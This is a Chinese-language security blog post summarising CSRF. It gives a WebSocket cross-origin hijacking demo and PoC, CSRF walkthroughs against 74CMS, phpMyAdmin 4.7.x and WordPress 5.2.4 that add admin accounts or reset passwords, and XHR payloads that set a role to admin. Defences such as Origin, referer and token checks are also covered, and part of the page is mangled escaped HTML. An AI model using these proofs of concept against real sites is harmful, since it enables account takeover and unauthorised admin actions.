class="function"><span class="keyword">function</span> <span class="title">incoming</span>(<span class="params">message</span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">'server: received %s'</span>, message);</span><br><span class="line">        ws.send(<span class="string">'server: reply'</span>);</span><br><span class="line">    &#125;);</span><br><span class="line"> </span><br><span class="line">    ws.on(<span class="string">'pong'</span>, () =&gt; &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">'server: received pong from client'</span>);</span><br><span class="line">    &#125;);</span><br><span class="line"> </span><br><span class="line">    ws.send(<span class="string">'world'</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// setInterval(() =&gt; &#123;</span></span><br><span class="line">    <span class="comment">//     ws.ping('', false, true);</span></span><br><span class="line">    <span class="comment">// &#125;, 2000);</span></span><br><span class="line">&#125;);</span><br><span class="line"> </span><br><span class="line">app.get(<span class="string">'/'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">  res.sendfile(__dirname + <span class="string">'/index.html'</span>);</span><br><span class="line">&#125;);</span><br><span class="line"> </span><br><span class="line">app.listen(<span class="number">3000</span>);</span><br></pre></td></tr></table></figure>
+<p><strong>cal.js</strong></p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> crypto = <span class="built_in">require</span>(<span class="string">'crypto'</span>);</span><br><span class="line"><span class="keyword">const</span> magic = <span class="string">'258EAFA5-E914-47DA-95CA-C5AB0DC85B11'</span>;</span><br><span class="line"><span class="keyword">const</span> secWebSocketKey = <span class="string">'w4v7O6xFTi36lq3RNcgctw=='</span>;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">let</span> secWebSocketAccept = crypto.createHash(<span class="string">'sha1'</span>)</span><br><span class="line">    .update(secWebSocketKey + magic)</span><br><span class="line">    .digest(<span class="string">'base64'</span>);</span><br><span class="line"> </span><br><span class="line"><span class="built_in">console</span>.log(secWebSocketAccept);</span><br><span class="line"><span class="comment">// Oy4NRAQ13jhfONC7bP8dTKb4PTU=</span></span><br></pre></td></tr></table></figure>
+<p><strong>index.html</strong></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>ws demo<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf8"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">  <span class="keyword">var</span> ws = <span class="keyword">new</span> WebSocket(<span class="string">'ws://192.168.1.101:9999'</span>);</span></span><br><span class="line"><span class="javascript">  ws.onopen = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">    <span class="built_in">console</span>.log(<span class="string">'client: ws connection is open'</span>);</span></span><br><span class="line"><span class="javascript">    ws.send(<span class="string">'hello'</span>);</span></span><br><span class="line"><span class="undefined">  &#125;;</span></span><br><span class="line"><span class="javascript">  ws.onmessage = <span class="function"><span class="keyword">function</span> (<span class="params">e</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">    <span class="built_in">console</span>.log(<span class="string">'client: received %s'</span>, e.data);</span></span><br><span class="line"><span class="undefined">  &#125;;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>监听服务端</p>
+<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1571478485.67.png" alt=""></p>
+<p>访问index.html发起请求，抓取数据包</p>
+<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1571478624.46.png" alt=""></p>
+<p>通过数据包可以看到，websocket通信要在http协议的基础上请求升级协议，升级的协议名为websocket,返回的数据包中说明了升级的协议以及正在连接的协议。</p>
+<p>下图时通过websocket的通信过程<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1571478800.27.png" alt=""></p>
+<p>在碰到使用使用websocket通信的目标时，测试方法和CORS类似， 篡改Origin，发现没有对Origin进行验证，也可以跨域进行协议升级。</p>
+<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1571478895.33.png" alt=""></p>
+<h3 id="跨域劫持测试："><a href="#跨域劫持测试：" class="headerlink" title="跨域劫持测试："></a>跨域劫持测试：</h3><p>poc如下：使用pocbox生成(如果时https协议的站点则需要将ws修改为wss)</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta charset=<span class="string">"utf-8"</span>&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ws_attack</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> ws = <span class="keyword">new</span> WebSocket(<span class="string">"ws://192.168.1.101:9999"</span>);</span><br><span class="line">    ws.onopen = <span class="function"><span class="keyword">function</span>(<span class="params">evt</span>) </span>&#123;</span><br><span class="line">        ws.send(<span class="string">"asdfafasd"</span>);</span><br><span class="line">    &#125;;</span><br><span class="line">    ws.onmessage = <span class="function"><span class="keyword">function</span>(<span class="params">evt</span>) </span>&#123;</span><br><span class="line">        alert(evt);</span><br><span class="line">        ws.close();</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br><span class="line">ws_attack();</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1571479086.26.png" alt=""></p>
+<p>触发</p>
+<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1571479187.67.png" alt=""></p>
+<p>防御：校验Origin头 ，websocket默认不校验</p>
+<h2 id="CSRF实战——74CMS"><a href="#CSRF实战——74CMS" class="headerlink" title="CSRF实战——74CMS"></a>CSRF实战——74CMS</h2><h3 id="登录74CMS的后台进行添加管理员操作并抓包"><a href="#登录74CMS的后台进行添加管理员操作并抓包" class="headerlink" title="登录74CMS的后台进行添加管理员操作并抓包"></a>登录74CMS的后台进行添加管理员操作并抓包</h3><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1568876799.13.png" alt=""><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1568876817.8.png" alt=""><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1568876946.98.png" alt=""></p>
+<p>无token且服务端没有验证referer，直接生成POC测试</p>
+<h3 id="生成POC，添加管理账户"><a href="#生成POC，添加管理账户" class="headerlink" title="生成POC，添加管理账户"></a>生成POC，添加管理账户</h3><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1568877019.83.png" alt=""></p>
+<p>返回后台查看，发现用户已经添加成功<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1568877075.24.png" alt=""></p>
+<h3 id="使用添加的账号登录"><a href="#使用添加的账号登录" class="headerlink" title="使用添加的账号登录"></a>使用添加的账号登录</h3><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1568877183.91.png" alt=""><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1568877231.37.png" alt=""></p>
+<h2 id="CSRF实战——phpMyAdmin-4-7-x-XSRF-CSRF"><a href="#CSRF实战——phpMyAdmin-4-7-x-XSRF-CSRF" class="headerlink" title="CSRF实战——phpMyAdmin 4.7.x XSRF/CSRF"></a>CSRF实战——phpMyAdmin 4.7.x XSRF/CSRF</h2><blockquote>
+<p>环境半天打不开哦，直接截图了</p>
+</blockquote>
+<h3 id="登录靶机"><a href="#登录靶机" class="headerlink" title="登录靶机"></a>登录靶机<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1568877618.55.png" alt=""></h3><h3 id="利用SQL语句更新密码，构造POC"><a href="#利用SQL语句更新密码，构造POC" class="headerlink" title="利用SQL语句更新密码，构造POC"></a>利用SQL语句更新密码，构造POC</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SET</span> passsword=<span class="keyword">PASSWORD</span>(<span class="string">'demos'</span>);</span><br><span class="line"> </span><br><span class="line">http://f1496b741e86dce4b2f79f3e839f977d.vsplate.me:19830/pma/sql.php?db=mysql&amp;table=user&amp;sql_query=<span class="keyword">SET</span>%<span class="number">20</span><span class="keyword">password</span></span><br><span class="line">%<span class="number">20</span>=%<span class="number">20</span><span class="keyword">PASSWORD</span>(%<span class="number">27</span>demos%<span class="number">27</span>)</span><br></pre></td></tr></table></figure>
+<p>然后即可利用短域名伪装发送，在这种特定场景下，还可以利用SQL语句进行写shell。</p>
+<h2 id="CSRF实战——wordpress5-2-4"><a href="#CSRF实战——wordpress5-2-4" class="headerlink" title="CSRF实战——wordpress5.2.4"></a>CSRF实战——wordpress5.2.4</h2><blockquote>
+<p>在后台添加账户处存在csrf，可以利用此处漏洞诱导管理员点击添加管理员账户</p>
+</blockquote>
+<p>没有referer和token、origin验证</p>
+<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1571716416.22.png" alt=""></p>
+<p>直接通过burp抓包生产CSRF-POC在浏览器测试</p>
+<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1571716515.04.png" alt=""></p>
+<p>结果如下</p>
+<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1571716543.41.png" alt=""></p>
+<h2 id="组合拳"><a href="#组合拳" class="headerlink" title="组合拳"></a>组合拳</h2><blockquote>
+<p>记录一些学习到的思路</p>
+</blockquote>
+<ul>
+<li><p>CSRF结合XSS形成上下文漏洞，绕过限制</p>
+</li>
+<li><p>CSRF结合URL跳转绕过限制</p>
+</li>
+<li><p><a href="https://gh0st.cn/archives/2018-04-28/1">CSRF结合点击劫持拿下权限</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这个思路比较有意思，首先有些平台会存在绑定第三方账号的功能，在已经登录的情况下，点击劫持伪造登录，诱导攻击者点击从而登录第三方账号(攻击者自己的账号),登录后iframe直接跳转到绑定的界面，然后劫持用户继续点击绑定，从而使得受害者在平台上绑定的第三方账号是攻击者注册的小号，从而利用这种思路劫持到受害者平台的权限。</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>CSRF的漏洞挖掘方式，在用户可以增删改(大多数情况)查(jsonp跨、flash跨域、cors跨域)，查看数据包中是否又token、目标表单是否又验证码、目标数据包是否验证了referer来源，json数据是否可以自定义callback函数、flash网站根目录下的crossdomain.xml 中的”access-from domain”是否为通配符、cors、websocket是否验证origin来源。</p>
+<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://www.freebuf.com/articles/web/118352.html">https://www.freebuf.com/articles/web/118352.html</a></p>
+<p><a href="https://xz.aliyun.com/t/6128#toc-16">https://xz.aliyun.com/t/6128#toc-16</a></p>
+<p><a href="https://www.vulnspy.com/?u=pmasa-2017-9">https://vulnspy.com/?u=pmasa-2017-9</a></p>
+<p><a href="https://xz.aliyun.com/t/5871#toc-3">https://xz.aliyun.com/t/5871#toc-3</a></p>
+<p><a href="https://c1h2e1.github.io/#">https://c1h2e1.github.io/#</a></p>
+<p><a href="https://gh0st.cn/archives/2018-03-22/1">https://gh0st.cn/archives/2018-03-22/1</a></p>
+<p><a href="https://gh0st.cn/archives/2019-03-20/1">https://gh0st.cn/archives/2019-03-20/1</a></p>
+<p><a href="https://www.cnblogs.com/chyingp/p/websocket-deep-in.html">https://www.cnblogs.com/chyingp/p/websocket-deep-in.html</a></p>
+<p><a href="https://xz.aliyun.com/t/5143">JSONP绕过CSRF防护token </a></p>
+<p><a href="https://gh0st.cn/archives/2018-08-01/1">https://gh0st.cn/archives/2018-08-01/1</a></p>
+<p><a href="https://gh0st.cn/archives/2018-04-28/1">https://gh0st.cn/archives/2018-04-28/1</a> </p>
+</script></h4>
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+      <div>
+        <ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者：</strong>
+    Demos
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://www.lsowl.top/2019/10/27/CSRF总结/" title="CSRF总结">https://www.lsowl.top/2019/10/27/CSRF总结/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>
+    本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/" rel="external nofollow" target="_blank">CC BY-NC-SA 3.0</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+
+      </div>
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/web前端/" rel="tag"><i class="fa fa-tag"></i> web前端</a>
+          
+            <a href="/tags/CSRF/" rel="tag"><i class="fa fa-tag"></i> CSRF</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/10/16/CVE-2019-14287-linux-sudo版本小于1-8-28本地root权限提升/" rel="next" title="CVE-2019-14287 linux sudo版本小于1.8.28本地root权限提升">
+                <i class="fa fa-chevron-left"></i> CVE-2019-14287 linux sudo版本小于1.8.28本地root权限提升
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/10/28/clickjack/" rel="prev" title="clickjack">
+                clickjack <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/avatar.jpg" alt="Demos">
+            
+              <p class="site-author-name" itemprop="name">Demos</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives">
+              
+                  <span class="site-state-item-count">32</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">10</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">44</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/demossl" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:demosqq@gmail.com" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                Links
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.shentoushi.top/" title="渗透师导航" target="_blank">渗透师导航</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://damit5.com" title="Damit5" target="_blank">Damit5</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://adad456.github.io" title="拾柒" target="_blank">拾柒</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#CSRF（跨站请求伪造）"><span class="nav-number">1.</span> <span class="nav-text">CSRF（跨站请求伪造）</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#CSRF的原理"><span class="nav-number">1.1.</span> <span class="nav-text">CSRF的原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CSRF的分类"><span class="nav-number">1.2.</span> <span class="nav-text">CSRF的分类</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#GET型"><span class="nav-number">1.2.1.</span> <span class="nav-text">GET型</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#POST型"><span class="nav-number">1.2.2.</span> <span class="nav-text">POST型</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#利用标签"><span class="nav-number">1.2.3.</span> <span class="nav-text">利用标签&lt;/h4&gt;&lt;figure class=&quot;highlight javascript&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&amp;lt;script&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; xhr = &lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; XMLHttpRequest();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;xhr.open(&lt;span class=&quot;string&quot;&gt;&quot;GET&quot;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&quot;http://www.example.com/api/currentuser&quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;xhr.send();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;lt;&lt;span class=&quot;regexp&quot;&gt;/script&amp;gt;ja&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;figure class=&quot;highlight javascript&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&amp;lt;script&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; xhr = &lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; XMLHttpRequest();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;xhr.open(&lt;span class=&quot;string&quot;&gt;&quot;POST&quot;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&quot;http://www.example.com/api/setrole&quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;xhr.setRequestHeader(&lt;span class=&quot;string&quot;&gt;&quot;Content-Type&quot;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&quot;text/plain&quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;xhr.send(&lt;span class=&quot;string&quot;&gt;&#39;&amp;#123;&quot;role&quot;:admin&amp;#125;&#39;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;lt;&lt;span class=&quot;regexp&quot;&gt;/script&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;figure class=&quot;highlight javascript&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&amp;lt;script&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; xhr = &lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; XMLHttpRequest();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;xhr.open(&lt;span class=&quot;string&quot;&gt;&quot;POST&quot;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&quot;http://www.example.com/api/setrole&quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;xhr.withCredentials = &lt;span class=&quot;literal&quot;&gt;true&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;xhr.setRequestHeader(&lt;span class=&quot;string&quot;&gt;&quot;Content-Type&quot;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&quot;application/json;charset=UTF-8&quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;xhr.send(&lt;span class=&quot;string&quot;&gt;&#39;&amp;#123;&quot;role&quot;:admin&amp;#125;&#39;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;lt;&lt;span class=&quot;regexp&quot;&gt;/script&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;h3 id=&quot;从信任角度来说明CSRF与XSS的区别&quot;&gt;&lt;a href=&quot;#从信任角度来说明CSRF与XSS的区别&quot; class=&quot;headerlink&quot; title=&quot;从信任角度来说明CSRF与XSS的区别&quot;&gt;&lt;/a&gt;从信任角度来说明CSRF与XSS的区别&lt;/h3&gt;&lt;p&gt;XSS：利用用户对站点的信任（就是客户端对服务器下发的文件默认是信任的）&lt;/p&gt;
+&lt;p&gt;CSRF：利用站点对已经身份认证的信任（默认站点只对经过身份认证的用户是信任的）&lt;/p&gt;
+&lt;h3 id=&quot;CSRF可能会出现的攻击场景&quot;&gt;&lt;a href=&quot;#CSRF可能会出现的攻击场景&quot; class=&quot;headerlink&quot; title=&quot;CSRF可能会出现的攻击场景&quot;&gt;&lt;/a&gt;CSRF可能会出现的攻击场景&lt;/h3&gt;&lt;p&gt;修改账号密码、个人信息（email、收货地址）&lt;/p&gt;
+&lt;p&gt;发送伪造的业务请求（网银、购物、投票）&lt;/p&gt;
+&lt;p&gt;关注他人社交账号、发送推文、留言评论等&lt;/p&gt;
+&lt;p&gt;未验证 Referer或者使用 Token 导致用户或者管理员可被 CSRF添加、修改、删除等操作&lt;/p&gt;
+&lt;p&gt;以转账为例：&lt;/p&gt;
+&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;初始化链接：http://www.xxx.com/pay.php?user=xx&amp;amp;amp;money=100&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;构造恶意链接：http://www.xxx.com/pay.php?user=恶意用户&amp;amp;amp;money=10000&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;h3 id=&quot;CSRF的执行原理图：这里就可以反应出来它与XSS的区别&quot;&gt;&lt;a href=&quot;#CSRF的执行原理图：这里就可以反应出来它与XSS的区别&quot; class=&quot;headerlink&quot; title=&quot;CSRF的执行原理图：这里就可以反应出来它与XSS的区别&quot;&gt;&lt;/a&gt;CSRF的执行原理图：这里就可以反应出来它与XSS的区别&lt;img src=&quot;https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1527347582.0.png&quot; alt=&quot;&quot;&gt;&lt;/h3&gt;&lt;h3 id=&quot;漏洞利用条件&quot;&gt;&lt;a href=&quot;#漏洞利用条件&quot; class=&quot;headerlink&quot; title=&quot;漏洞利用条件&quot;&gt;&lt;/a&gt;漏洞利用条件&lt;/h3&gt;&lt;p&gt;被攻击用户已经完成身份认证(已登录)&lt;/p&gt;
+&lt;p&gt;新请求的提交不需要重新身份认证或确认机制（如果有token机制则需要获取token，但是由于跨域的原因，攻击者构造的攻击代码无法直接请求被攻击服务器，无法获取token，但是如果配合XSS漏洞获取token，基于token的防护机制就形同虚设）&lt;/p&gt;
+&lt;h3 id=&quot;CSRF可能存在的点以及检测方法&quot;&gt;&lt;a href=&quot;#CSRF可能存在的点以及检测方法&quot; class=&quot;headerlink&quot; title=&quot;CSRF可能存在的点以及检测方法&quot;&gt;&lt;/a&gt;CSRF可能存在的点以及检测方法&lt;/h3&gt;&lt;p&gt;寻找测试站点&lt;strong&gt;增删改&lt;/strong&gt;的地方，构造HTML，修改HTML表单中某些参数，使用浏览器打开该HTML，点击提交表单后查看响应结果，看该操作是否成功执行。&lt;/p&gt;
